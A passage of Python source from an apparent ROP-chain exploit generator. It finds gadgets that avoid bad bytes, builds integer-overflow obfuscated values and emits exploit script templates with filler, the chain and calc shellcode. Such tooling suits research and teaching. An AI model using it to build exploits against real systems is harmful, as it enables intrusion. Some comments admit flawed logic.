						# print (cya, out,res, reg)
						rC+=1
						outEmObj=rop_tester(myDict[p].raw,"findMovDeref",reg)
						# outEmObj.show()
						checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs)#,[reg])
						# print (red,22, excludeRegs,reg,res)
						if checkedFree:
							if reg != op2:
								# print (yel,"maybe", out,red, excludeRegs,reg,res)
								if outEmObj.verifyRegUnchanged(reg):
									# print (gre,"got one", out,res)
									# c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
									# c2Amt=0
									# if c2Search:
									# 	c2Ret=c2Search[0].split("ret ")
									# 	try:
									# 		c2Amt=int(c2Ret[1],16)
									# 	except:
									# 		c2Amt=int(c2Ret[1])
									c2Amt=calcC2Amount(p)
									stackPivotAmount=stackPivotAmount
									# print(disOffset(p), stackPivotAmount, c2Amt)
									return True, p, stackPivotAmount
		return False,0
	else:
		dp ("return false findmovderef")
		return False,0
def printDict(myDict):
	t=0
	for each in myDict:
		p=chainObj(each, "test", [])
		if t==0:
			pk=[p]
		else:
			pk.extend([p])
		t+=1
	showChain(pk)

def findMovDerefLeftJustOneLoad(reg,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
	# print("findMovDerefLeftJustOne", reg)
	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
	bFind, pk=findMovDerefLeftSingle(reg,bad,length1, excludeRegs,comment,espDesiredMovement)
	if bFind:
		foundP2, p2, chP = loadReg(reg,bad,length1,excludeRegs,val,comment,False,"test")
		if foundP2:
			pk=pkBuild([chP,pk])
			return bFind,pk
		return True, pk

	for r in excludeRegs:
		availableRegs.remove(r)
	for r in availableRegs:
		# print (r)
		bFind, pk=findMovDerefLeft(reg,r,bad,length1, excludeRegs,comment,espDesiredMovement)
		if bFind:
			foundP2, p2, chP = loadReg(r,bad,length1,excludeRegs,val,comment,False,"test")
			if foundP2:
				pk=pkBuild([chP,pk])
				return bFind,pk
	return False, 0
def findMovDerefLeftLoadReg1(reg1,reg2,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
	print("findMovDerefLeftLoadReg1", reg1,reg2)
	excludeRegs.append(reg1)
	excludeRegs.append(reg2)


	bFind, pk=findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
	if bFind:
		excludeRegs.append(reg1)
		foundP2, p2, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment,False,"test")
		if foundP2:
			pk=pkBuild([chP,pk])
			return bFind,pk
	return False, 0

def findMovDerefLeftLoadReg2(reg1,reg2,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
	print("findMovDerefLeftLoadReg2", reg1,reg2)
	try:
		excludeRegs2=set(excludeRegs)
		if  reg1 not in excludeRegs2:
			excludeRegs.append(reg1)
		if  reg1 not in excludeRegs2:
			excludeRegs.append(reg2)

		bFind, pk=findMovDerefLeftSingle(reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
		print (32,excludeRegsGlobal )

		if bFind:
			foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,val,comment,False,"test")
			print (33,excludeRegsGlobal )
			
			if foundP2:
				pk=pkBuild([chP,pk])
				return bFind,pk
			return True, pk

		print (4,excludeRegsGlobal )

		bFind2, pk=findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
		if bFind2:
			print (5,excludeRegsGlobal )
			
			foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,val,comment,False,"test")
			if foundP2:
				pk=pkBuild([chP,pk])
				return bFind,pk
		return False, 0
	except Exception as e:
		print ("findMovDerefLeftLoadReg2:")
		print (e)
		print(traceback.format_exc())

def findMovDerefLeftJustOne(reg,bad,length1, excludeRegs,comment,espDesiredMovement=0):
	print("findMovDerefLeftJustOne", reg)
	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
	bFind, pk=findMovDerefLeftSingle(reg,bad,length1, excludeRegs,comment,espDesiredMovement)
	if bFind:
		return True, pk

	for r in excludeRegs:
		availableRegs.remove(r)
	for r in availableRegs:
		print (r)
		bFind, pk=findMovDerefLeft(reg,r,bad,length1, excludeRegs,comment,espDesiredMovement)
		return bFind,pk
	return False, 0


def findMovDerefLeftSingle(reg1,bad,length1, excludeRegs2,comment,espDesiredMovement=0):
	global excludeRegsGlobal
	# print ("findMovDerefLeft", reg1)
	foundM1, m1 = findMovDeref2(reg1,reg1,bad,length1, excludeRegs2,espDesiredMovement)

	if foundM1:
		# print ("have it", gre,disOffset(m1),res)
		cM1=chainObj(m1, comment, [])

		pk=pkBuild([cM1])
		return True, pk
	return False,0

def findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement=0):
	# print ("findMovDerefLeft", reg1,reg2)

	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
	for r in excludeRegs:
		availableRegs.remove(r)
	for r in availableRegs:
		# print ("r", r)
		foundM2, m2 = findMovDeref2(r,reg2,bad,length1, excludeRegs,espDesiredMovement)
		if foundM2:
			excludeRegs2= copy.deepcopy(excludeRegs)
			excludeRegs2.append(reg1)
			excludeRegs2.append(reg2)
			# foundT, gT = findUniTransferOld("1",reg1,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + reg1 +  " - " +comment,True, True,True)
			foundT, gT = findUniTransfer("1",reg1,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + reg1 +  " - " +comment)

			# foundT=False
			if foundT:
				# print (excludeRegs2)
				pk=pkBuild([m2,gT])
				# print (cya,"This is a good one2", reg1,reg2)
				# showChain(pk,True)
				# print(res)
				return True, pk
	return False,0

		

def findMovDeref2Old(reg,op2,bad,length1, excludeRegs,espDesiredMovement=0):
	dp ("findMovDeref2:", reg, length1)
	bExists, myDict=fg.getFg("movDword2",reg)
	# dpDict(myDict)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="dword ptr ["+reg+"]":
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="dword ptr ["+reg+"]":
					dp ("found movDword2", reg)
					return True,p
				dp ("movDword2 clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree(("movDword2",reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist:
					dp ("found movDword2 alt", reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false findmovderef")
		return False,0

def findMovDeref2(reg1,reg2,bad,length1, excludeRegs,espDesiredMovement=0):
	dp ("findMovDeref2:", reg1, length1)
	# print ("findMovDeref2:", reg1,reg2, length1)
	bExists, myDict=fg.getFg("movDword2",reg1)
	# dpDict(myDict)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				# print (disOffset(p))
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="dword ptr ["+reg2+"]":
					# print (gre,"yes", fg.rop[p].op1, fg.rop[p].op2, res)
				 # and fg.rop[p].op1==op2:
					# print ("yes")
					return True,p
			return False,0
	return False,0
def findPush(reg,bad,length1, excludeRegs,espDesiredMovement=-4):
	dp ("findPush:", reg, length1)
	bExists, myDict=fg.getFg("push",reg)
	if bExists:
		# length1=False
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget, push eax / ret
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				# print ("p",p)
				# print(myDict[p].length,myDict[p].opcode, freeBad)
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findpush1", reg)
					return True,p, myDict
			return False,0,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findPush2", reg)
					return True,p, myDict
				dp ("findPush clob")
				pushExists, p1, myDict, rObj = rop_testerFindClobberFree(("push",reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if pushExists:
					dp ("found findPush alt", reg)
					return True,p1, myDict
				else:
					return False,0,0
	else:
		# dp ("return false findpush")
		return False,0,0

def findRet(bad, mode64=False):
	dp ("findRet")
	if not mode64:
		bExists, myDict=fg.getFg("ret")
	else:
		bExists, myDict=fg.getFg("ret64")

	# dp ("dict size", reg, len(myDict))
	if bExists:
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if  myDict[p].opcode=="c3" and freeBad:
				dp ("found ret")
				return True,p, myDict
	return False,0,0

def findRetf(bad, mode64=False):
	dp ("findRetf")
	if not mode64:
		bExists, myDict=fg.getFg("retfSingle")
	else:
		bExists, myDict=fg.getFg("retfSingle64")

	# dp ("dict size", reg, len(myDict))
	if bExists:
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if  myDict[p].opcode=="c3" and freeBad:
				dp ("found retf")
				return True,p, myDict
	return False,0,0

def findRetC2(bad,val):
	dp ("findRetC2",val, type(val))
	global rc2
	if val==4:
		try:
			retC2=rc2.g04
		except:
			return False,0,0
	elif val==8:
		try:
			retC2=rc2.g08
		except:
			return False,0,0
	elif val==0xc:
		try:
			retC2=rc2.g0c
		except:
			return False,0,0
	else:
		dp ("none!!!")
	tryThis= "with " + hex(img(retC2)) 
	tryThis2=" -> " + disOffset(retC2)
	dp (tryThis)
	dp(tryThis2)
	cRc2=chainObj(retC2, "", [])
	return True,retC2,cRc2
	


###### logic is flawed --- may find inferior gadget for length1=false -   first 4 may fail length1 T and F, 5th one passes clobberfree but not length1, 6th one is length1 - we do not consider the 6th one

def findPushad(bad,length1, excludeRegs,espDesiredMovement=4):
	dp ("findPushad")
	bExists, myDict=fg.getFg("pushad")
	# dp ("dict size", reg, len(myDict))
	backupPushad=0x99
	if bExists:
		dp ("pushad exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget, pop eax / ret
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if myDict[p].length ==1 and myDict[p].opcode=="c3":
					dp ("found findPushad")
					backupPushad=p
					if freeBad:
						return True,p, myDict
					else:
						return False, backupPushad, myDict
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findPushad")

					return True,p, myDict
				dp ("findPushad clob")
				popExists, p1, myDict, rObj = rop_testerFindClobberFree(("pushad"), excludeRegs,bad, "c3", espDesiredMovement,[])
				if popExists:
					dp ("found findPushad alt")
					return True,p1, myDict
				else:
					return False,0,0
	else:
		# dp ("return false findpop")
		return False,0,0

def findPop(reg,bad,length1, excludeRegs,espDesiredMovement=4,isVal=False):
	dp ("findPop", reg)
	bExists, myDict=fg.getFg("pop",reg)
	# dp ("dict size", reg, len(myDict))
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget, pop eax / ret
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findpop", reg)
					return True,p, myDict
			return False,0,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found findpop2", reg)
					return True,p, myDict
				dp ("findpop clob")
				popExists, p1, myDict, rObj = rop_testerFindClobberFree(("pop",reg), excludeRegs,bad, "c3", espDesiredMovement,[reg])
				if popExists:
					dp ("found findpop alt", reg)
					return True,p1, myDict
				else:
					return False,0,0
	else:
		# dp ("return false findpop")
		return False,0,0

def findAddRegReg(reg,bad,availableRegs, excludeRegs, espDesiredMovement):
	dp ("findAddRegReg",reg, "excludeRegs", excludeRegs, "availableRegs", availableRegs, "espDesiredMovement",espDesiredMovement)
	if None in availableRegs:
		availableRegs.remove(None)
	bExists,myDict=fg.getFg("add",reg)
	if bExists:
		for p in myDict:
			# dp ("\tpossible", myDict[p].op1, myDict[p].op2, "length", myDict[p].length, hex(p))
			# dp ("\t-->",disMini(myDict[p].raw, myDict[p].offset))
			if myDict[p].length ==1 and myDict[p].opcode=="c3":
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if any(item in myDict[p].op2 for item in availableRegs) and myDict[p].op2!=reg and freeBad:
					dp ("yes!", myDict[p].op2)
					dp ("\tadd",disMini(myDict[p].raw, myDict[p].offset))
					return True,p,myDict, reg, myDict[p].op2,0
		
		#OTHER less desirable gadgets
		# for p in myDict:
		
	### skip for now
	if 2==3:
		addExists, p, myDict, rObj = rop_testerFindClobberFreeRegReg(myDict, excludeRegs,bad,"c3",espDesiredMovement,[])
		if addExists and len(myDict[p].op2)==3:
			dp ("\tpossible", myDict[p].op1, myDict[p].op2, "length", myDict[p].length, hex(p))
			dp ("myDict[p].op1 -->",myDict[p].op1, len(myDict[p].op1))
			dp("myDict[p].op2 -->", myDict[p].op2, len(myDict[p].op2))
			print ("\t-->",disMini(myDict[p].raw, myDict[p].offset))
			
			if any(item in myDict[p].op2 for item in availableRegs) and myDict[p].op2!=reg:
				print ("yes alt!", myDict[p].op2)
				dp ("\tadd alt",disMini(myDict[p].raw, myDict[p].offset))
				return True,p,myDict, reg, myDict[p].op2,0

	#else#
	#    freeOfClobbering=out.checkForBad(excludeRegs, [0-8])  #-4 esp desirved movement  = push -4
	dp ("returning false!!!! WTF!!!")
	return False,0, 3,0,0,0

def findAddValtoESP(val,bad, excludeRegs):
	dp ("findAddValtoESP")
	bExists,myDict=fg.getFg("addESPVal")
	if bExists:
		for p in myDict:
			# dp ("\tpossible", myDict[p].op1, myDict[p].op2, "length", myDict[p].length, hex(p))
			# dp ("\t-->",disMini(myDict[p].raw, myDict[p].offset))
			# dp (myDict[p].op2, type(myDict[p].op2), len(myDict[p].op2), "length", myDict[p].length, myDict[p].opcode)
			# dp ("\tval", val, "len", type(val))
			if myDict[p].length ==1 and myDict[p].opcode=="c3" and myDict[p].op2==val:
				# dp ("bad", binaryToStr(bad))
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if freeBad:
					dp ("\tadd",disMini(myDict[p].raw, myDict[p].offset))
					chAE=chainObj(p, "", [])

					return True,p,chAE
		if 1==2:
		##todo					
			addExists, p, myDict, rObj = rop_testerFindClobberFreeRegReg(myDict, excludeRegs,bad,"c3",espDesiredMovement,[])
			if addExists and len(myDict[p].op2)==3:
				dp ("\tpossible", myDict[p].op1, myDict[p].op2, "length", myDict[p].length, hex(p))
				dp ("myDict[p].op1 -->",myDict[p].op1, len(myDict[p].op1))
				dp("myDict[p].op2 -->", myDict[p].op2, len(myDict[p].op2))
				dp ("\t-->",disMini(myDict[p].raw, myDict[p].offset))
				
				if any(item in myDict[p].op2 for item in availableRegs) and myDict[p].op2!=reg:
					dp ("yes alt!", myDict[p].op2)
					dp ("\tadd esp alt",disMini(myDict[p].raw, myDict[p].offset))
					return True,p,myDict, reg, myDict[p].op2,0

	return False,0, 0
def imgOld(p, myDict):
	img=myDict[p].g.offset + pe[n].startLoc
	return img

def img(p, fg2=None):
	# print(mag, "img",res)
	global fg  #not sure why global needed
	img=p
	try:
		if 'gadgets.ropChainObj' in str(type(fg2[p])):  # lol not sure why a more straightforward comparison ddoesn't work for me
			myChainDict=fg2
			img=myChainDict[p].g.offset + pe[n].startLoc
			return img
	except:
		pass
	if fg2==None: #could be needed if done with parallelization
		global fg  #not sure why global needed
		try:
			img=fg.rop[p].offset + pe[n].startLoc
		except:
			# print(red,"oh no", p, hex(p), pe[n].startLoc,res)
			pass
	else:
		try:

			fg=fg2
			img=fg.rop[p].offset + pe[n].startLoc
		except:
			print (red+"error -> img:", p, res)
			print (hex(p))
			return p
	return img
def showChain(myDict,printYes=False,GiveText=False):
	t=0
	
	if printYes:
		t=0
		prevStackC2=[]
		for rChObj in myDict:

			print (t,"\t",  "0x"+str(hx (img(t,myDict), 8)) , disMini(myDict[t].g.raw, myDict[t].g.offset), " # ", myDict[t].comment,"#",myDict[t].g.mod )
			try:
				myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
			except:
				myDict[t].g.stC2=[]
			
			for val in (prevStackC2):
				if type(val)==int:
					print (yel,"\t",hex(val),res)
			for val in (myDict[t].stack):
				if type(val)==int:
					print ("\t",hex(val))

			prevStackC2=myDict[t].g.stC2			
			t=t+1
	else:
		t=0
		prevStackC2=[]
		for rChObj in myDict:
			dp (t,"\t",  "0x"+str(hx (img(t,myDict), 8)) , disMini(myDict[t].g.raw, myDict[t].g.offset), " # ", myDict[t].comment,"#",myDict[t].g.mod )
			try:
				myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
			except:
				myDict[t].g.stC2=[]
			
			for val in (prevStackC2):
				if type(val)==int:
					dp (yel,"\t",hex(val),res)

			for val in (myDict[t].stack):
				if type(val)==int:
					dp ("\t",hex(val))
			prevStackC2=myDict[t].g.stC2			

			t=t+1
	t=0
	if GiveText:
		txt=""
		try:
			prevStackC2=[]
			for rChObj in myDict:
				txt+= str(t)+"\t" +  "0x"+str(hx (img(t,myDict), 8)) + " " + disMini(myDict[t].g.raw, myDict[t].g.offset) + " # "+		 myDict[t].comment +" # "+myDict[t].g.mod +"\n"

				try:
					myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
				except:
					myDict[t].g.stC2=[]
				
				for val in (prevStackC2):
					if type(val)==int:
						txt+=  ("\t"+		hex(val)+"\n")
					
				for val in (myDict[t].stack):
					if type(val)==int:
						txt+=  ("\t"+		hex(val)+"\n")
				prevStackC2=myDict[t].g.stC2			
				
				t=t+1
			return txt
		except Exception as e:
			print (e)
			print(traceback.format_exc())
# import io

# def print_to_string(*args, **kwargs):
#     output = io.StringIO()
#     print(*args, file=output, **kwargs)
#     contents = output.getvalue()
#     output.close()
#     return contents

def genOutput(myDict, typePattern=None):
	dp ("genOutput", typePattern)
	global curPat
	global oldPat
	t=0

	myParams=[]
	myStrings=[]
	if typePattern=="LoadLibrary":
		s =distanceDict["targetDllString"]["loc1"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="targetDll = " + "'"+s
		myStrings.append(s)
		param="params=bytes(targetDll,'utf-8')"		
		myParams.append(param)
		dist=distanceDict["targetDllString"]["distanceToPayload"]
	elif typePattern=="GetProcAddress":
		s =distanceDict["targetDllString"]["loc1"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="targetDll = " + "'"+s
		myStrings.append(s)
		s =distanceDict["targetDllString"]["loc2"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="targetAPI = " + "'"+s
		myStrings.append(s)
		param="params=bytes(targetDll + targetAPI,'utf-8')"		
		myParams.append(param)
		dist=distanceDict["targetDllString"]["distanceToPayload"]
	elif typePattern=="System":
		s =distanceDict["targetDllString"]["loc1"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="targetDll = " + "'"+s
		myStrings.append(s)
		s =distanceDict["targetDllString"]["loc2"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="targetAPI = " + "'"+s
		myStrings.append(s)
		s =distanceDict["targetDllString"]["loc3"]["String"] 
		s+= "' + " +"'\\x00\\x00'\n"
		s="command = " + "'"+s
		myStrings.append(s)
		param="params=bytes(targetDll + targetAPI + command,'utf-8')"		
		myParams.append(param)
		dist=distanceDict["targetDllString"]["distanceToPayload"]
	else:
		dist=0
		pass

	out=""
	cOut=""
	out+=genCode1()

	cOut=whi+out
	out+="gList = [\n"
	prevStackC2=[]
	for g in myDict:
		out+= "\t"+  "0x"+str(hx (img(t,myDict), 8))+ ", # " + disMini(myDict[t].g.raw, myDict[t].g.offset) + " # " + myDict[t].comment + " # " +myDict[t].g.mod +"\n"
		for val in (prevStackC2):
			out+= "\t" +"0x"+str(hx (val, 8))+ ", #\n"
		for val in (myDict[t].stack):
			out+= "\t" +"0x"+str(hx (val, 8))+ ", #\n"

		try:
			myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			myDict[t].g.stC2=[]		
		prevStackC2=myDict[t].g.stC2			
		t=t+1
	out+="\t]\n\n"
	
	t=0
	prevStackC2=[]
	cOut+="gList = [\n"
	for g in myDict:
		cOut+= gre+"\t"+  "0x"+str(hx (img(t,myDict), 8))+ whi+", # " + yel+ disMini(myDict[t].g.raw, myDict[t].g.offset) + whi+ " # " +cya+ myDict[t].comment + whi+ " # " +blu+ myDict[t].g.mod +whi+"\n"
		for val in (prevStackC2):
			cOut+= "\t" +gre+"0x"+str(hx (val, 8))+ whi+ ", #\n"
		for val in (myDict[t].stack):
			cOut+= "\t" +gre+"0x"+str(hx (val, 8))+ whi+ ", #\n"

		try:
			myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			myDict[t].g.stC2=[]
		prevStackC2=myDict[t].g.stC2			
		t=t+1

	cOut+="\t]\n\n"
	

	if typePattern !=None and typePattern !="HG"and typePattern !="VA"and typePattern !="VP" or typePattern =="V2A":
		outP=genCode2(True)
		outP+="startParams="+hex(dist)+"\n"
		for s in myStrings:
			outP+=s
		outP+="payload = ch+ (startParams-len(ch))*filler\n"

		for p in myParams:
			outP+=p
		outP+=genCode3(True)
	elif typePattern=="VA" or typePattern=="VP":
		outP=genCode2(True)
		outP+=genCalcShellcode()
		outP+="payload = (filler * 100) + ch + calc_shellcode\n"
		outP+="# 100 - amount sufficient to achieve overflow, etc.\n"

		outP+=genCode3(False)
	else:
		outP=genCode2(False)
		outP+="payload = ch\n"
		outP+=genCode3(False)
	
	outP+=genClose()

	out+=outP
	cOut+=whi+outP
	if typePattern != None:
		out+="\n\n#Pattern: " +oldPat+ curPat
		cOut+=gre+"\n\n#Pattern: "+ cya+oldPat+ curPat+res
	dp (out)

	return cOut,out

def genOutput64(myDict, typePattern=None):
	dp ("genOutput", typePattern)
	global curPat
	global oldPat
	t=0

	
	out=""
	out+=genCode1_64()

	cOut=whi+out
	out+="gListQ = [\n"

	prevStackC2=[]
	for g in myDict:
		out+= "\t"+  "0x"+str(hx (img(t,myDict), 16))+ ", #" + disMini(myDict[t].g.raw, myDict[t].g.offset) + " # " + myDict[t].comment + " # " +myDict[t].g.mod +"\n"
		for val in (prevStackC2):
			out+= "\t" +"0x"+str(hx (val, 16))+ ", #\n"
		
		for val in (myDict[t].stack):
			cOut+= "\t" + gre +"0x"+str(hx (val, 16))+ whi+ ", #\n"


		# for val in (myDict[t].stack):
		# 	out+= "\t" +"0x"+str(hx (val, 16))+ ", #\n"

		try:
			myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			myDict[t].g.stC2=[]			
		prevStackC2=myDict[t].g.stC2	
		t=t+1
	out+="\t]\n\n"
	
	t=0
	prevStackC2=[]
	for g in myDict:
		cOut+= "\t"+ gre+ "0x"+str(hx (img(t,myDict), 16))+ whi+", #" +yel+ disMini(myDict[t].g.raw, myDict[t].g.offset) + whi+" # " +cya+ myDict[t].comment + whi+" # " +blu+myDict[t].g.mod +"\n"
		for val in (prevStackC2):
			out+= "\t" +"0x"+str(hx (val, 16))+ ", #\n"
		
		for val in (myDict[t].stack):
			cOut+= "\t" + gre +"0x"+str(hx (val, 16))+ whi+ ", #\n"


		# for val in (myDict[t].stack):
		# 	cOut+= "\t" + gre +"0x"+str(hx (val, 16))+ whi+ ", #\n"

		try:
			myLen=len(myDict[t].g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			myDict[t].g.stC2=[]			
		prevStackC2=myDict[t].g.stC2	
		t=t+1
	cOut+=whi+"\t]\n\n"
	
	outP=genCode2_64(False)
	outP+="payload = ch\n"
	outP+=genCode3(False)

	outP+=genClose()
	out+=outP
	cOut+=outP
	if typePattern != None:
		out+="\n\n#Pattern: " +oldPat+ curPat
		cOut+=gre+"\n\n#Pattern: " +cya+oldPat+ curPat+res

	dp (out)
	return cOut,out
def tryThisFunc(goal):
	try:
		tryThis= " -> " + disOffset(goal)
	except:
		try:
			tryThis= " -> " + disOffset(goal-pe[n].startLoc+pe[n].emBase)
		except:
			tryThis=""

	return tryThis

def regListToFront(test_list, r):
	if r in test_list:
		test_list.remove(r)
	test_list.insert(0,r)
	return test_list

def buildIntOverflowPR(excludeRegs,bad,goal,tThis, bb, withPR=True, regFirst=None, comment=None, isVal=False):
	# print(red + "buildIntOverflowPR", regFirst, "target val", goal,res)
	# print (yel,"bi1", excludeRegs,bad,goal,tThis, bb, withPR, regFirst, res)
	if regFirst!=None:
		intSuccess, package =buildIntOverflowPRTargetReg(excludeRegs,bad,goal,tThis, bb, withPR, regFirst,comment,isVal)
	else:
		intSuccess, package =buildIntOverflowPR2(excludeRegs,bad,goal,tThis, bb, withPR)
	return intSuccess, package

def buildIntOverflowPRTargetReg(excludeRegs,bad,goal,tThis, bb, withPR=True, regFirst=None, comment=None,isVal=False):
	# print (yel,"bi2", excludeRegs,bad,goal,tThis, bb, withPR, regFirst, res)

	dp("buildIntOverflowPR")
	# print(red + "buildIntOverflowPR", regFirst, "target val", goal,res)
	# print ("excludeRegs", excludeRegs)
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	aP1=0
	p1=0
	p2=0
	intDict={}
	buildSucces=False
	foundPu1=True
	success, obf1,obf2=buildObfValuesIntOverflow(goal,bad,bb)
	if not success:
		dp ("Cannot find desired integer overflow")
		return False,1
	if success:
		dp ("Got obfuscation values for integer oveflow:")
		dp (hex(obf1), hex(obf2))
	for reg in excludeRegs:
		try:
			availableRegs.remove(reg)
		except:
			pass
	espDesiredMovement=4
	addEspMove=0
	foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(regFirst,bad,availableRegs,excludeRegs, addEspMove)
	if not foundAdd:
		# print ("hit the continue")
		return False,1
	foundP1, p1, popD1 = findPop(regFirst,bad,True,excludeRegs)
	if not foundP1:
		# print ("hit the continue")
		return False,1
	
	for r in availableRegs:
		foundP2, p2, popD2 = findPop(reg2,bad,True,excludeRegs)
		if withPR:
			foundPu1, pu1, pushD1 = findPush(regFirst,bad,True,excludeRegs)
		if foundAdd and foundP1 and foundP2 and foundPu1:
			dp ("got build int overflow template")
			buildSucces=True
			break
	# buildSucces=False
	if not buildSucces:
		# print ("IN ALTERNATE buildIntOverflowPR template")
		# print ("availableRegs", availableRegs)
		foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(regFirst,bad,availableRegs,excludeRegs, addEspMove)
		if not foundAdd:
			return False,1
		foundP1, p1, popD1 = findPop(regFirst,bad,True,excludeRegs)
		for r in availableRegs:
			foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(regFirst,bad,availableRegs, excludeRegs, addEspMove)
			if not foundAdd:
				return False,1
			### need add desired movement
			#### create loop for desireved move - incrementing by 4 - will check already emulateds
			foundP2, p2, popD2 = findPop(reg2,bad,False,excludeRegs,4)
			foundPu1=True
			if withPR:
				foundPu1, pu1, pushD1 = findPush(firstReg,bad,False,excludeRegs,-4)
			if foundAdd and foundP1 and foundP2 and foundPu1:
				dp ("got build int overflow template ALTERNATE")
				buildSucces=True
				break
	
	if buildSucces:
		tryThis=tryThisFunc(goal)
	
		dp ("\n\n-----integer overflow")

		com1 = redundantComChecker("",hx(goal,8)+tryThis,comment)

		p1Obj=addChain(popD1[p1], "load obfsucated value for int overflow", [obf1], intDict,0)
		p2Obj=addChain(popD2[p2], "load obfsucated value for int overflow", [obf2], intDict,1)
		addObj=addChain(addD1[aP1], "generate deobfuscated: 0x" +  com1, [], intDict,2)
		package=[p1Obj, p2Obj,addObj]

		if withPR:
			tTh=tryThisFunc(goal)
			prObj=addChain(pushD1[pu1], "Push/ret - going to 0x" + hx(goal,8) + tTh, [], intDict,3)
			package.extend([prObj])

		# p1Obj.setObf("intOverflow",[p1Obj, p2Obj,addObj,prObj] )
		frc.intOverflow[0]=intDict
		# print (intDict)
		# showChain(intDict)
		# showChain(package)
		genOutput(intDict)
		# dp ("\n\n-----\n")
		return buildSucces,  package
	return buildSucces, []


def buildIntOverflowPR2(excludeRegs,bad,goal,tThis, bb, withPR=True):
	dp("buildIntOverflowPR")
	# print("buildIntOverflowPR")
	# print ("excludeRegs", excludeRegs)

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	aP1=0
	p1=0
	p2=0
	intDict={}
	buildSucces=False
	foundPu1=True
	success, obf1,obf2=buildObfValuesIntOverflow(goal,bad,bb)
	if not success:
		dp ("Cannot find desired integer overflow")
		return False,1
	if success:
		dp ("Got obfuscation values for integer oveflow:")
